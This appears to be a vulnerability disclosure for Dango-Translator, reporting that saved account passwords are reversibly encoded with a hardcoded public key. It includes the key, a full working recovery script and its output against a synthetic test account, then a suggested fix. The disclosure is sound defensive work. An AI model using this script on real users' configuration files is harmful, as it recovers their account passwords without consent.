# Dango-Translator: Saved account password is reversible using a public hardcoded key

**Upstream issue:** [PantsuDango/Dango-Translator#188](https://github.com/PantsuDango/Dango-Translator/issues/188)
...
Weakness: CWE-321 / CWE-922

## Description

`utils/http.py:172-176` saves the account password in config/config.yaml after login. `utils/enctry.py:2-17` uses a fixed public key and reversible character arithmetic, allowing offline recovery without importing the application.

## Impact

A party already able to read this user's configuration can recover the saved plaintext password. This is a local secret-storage issue; no cross-user file-permission bypass or remote password extraction is established.
...
Stages: `launch`, then `login`; afterwards run `recover_password.py <deploy/app/config/config.yaml>`. The complete independent recovery script, omitted from the original single-finding report, is included below.
...
### `mitm/recover_password.py`

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-P8-005 独立恢复脚本 — 攻击者视角: 只读 config/config.yaml, 用公开源码中
的硬编码密钥独立重实现可逆算法 (不 import 项目代码), 恢复明文口令。
"""
import sys

# 硬编码密钥 (utils/enctry.py 第3行, 开源可读)
KEY = 'q%UyQ1.gJTm>|?86*|T]JMfA6?EWmL-~%=]pq!~}'
SEP = '%6?u!'

def attacker_decrypt(blob):
    """独立重实现: enctry 是 ord(plain)+ord(key) 的十进制串以 %6?u! 连接。"""
    out = ""
    for i, j in zip(blob.split(SEP)[:-1], KEY):
        out += chr(int(i) - ord(j))
    return out

def main():
    cfg_path = sys.argv[1] if len(sys.argv) > 1 else "../deploy/app/config/config.yaml"
    cipher = None
    for line in open(cfg_path, encoding="utf-8"):
        if line.startswith("password:"):
            cipher = line.split("password:", 1)[1].strip().strip("'\"")
    assert cipher and SEP in cipher, "config.yaml 中未找到密文"
    plain = attacker_decrypt(cipher)
    print("[attacker] 读取到 config.yaml (真实 app 在 GUI 登录成功后写入):")
    print("  password(密文) =", cipher)
    print("[attacker] 独立重实现算法恢复明文:")
    print("  password(明文) =", plain)
...
After a real GUI login against the synthetic service, the app wrote the encoded password. The independent recovery script reconstructed `PwnPass-42bd86232c97c8bf` exactly. The shared MITM harness supplied a test login response; a network attacker is not required for the offline storage weakness.
...
```text
[attacker] 读取到 config.yaml (真实 app 在 GUI 登录成功后写入):
  password(密文) = 193%6?u!156%6?u!195%6?u!201%6?u!178%6?u!...%6?u!167%6?u!
[attacker] 独立重实现算法恢复明文:
  password(明文) = PwnPass-42bd86232c97c8bf
```

## Suggested fix

Avoid storing the account password; prefer revocable session credentials protected by the operating system credential store. Provide migration/removal for existing reversible password values.
